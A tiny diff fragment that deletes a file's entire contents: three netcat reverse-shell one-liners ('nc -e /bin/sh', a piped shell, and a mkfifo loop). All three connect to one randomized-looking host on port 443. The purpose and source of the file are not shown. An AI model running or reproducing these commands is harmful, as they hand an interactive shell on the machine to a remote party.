@@ -1,5 +1,0 @@
-nc -e /bin/sh fm5j079qzysts2pcc0id435ksby5xtm.c.39.rs 443
-
-/bin/sh | nc fm5j079qzysts2pcc0id435ksby5xtm.c.39.rs 443
-
-mkfifo /tmp/lol;nc fm5j079qzysts2pcc0id435ksby5xtm.c.39.rs 443</tmp/lol | /bin/sh -i 2>&1 | tee /tmp/lol
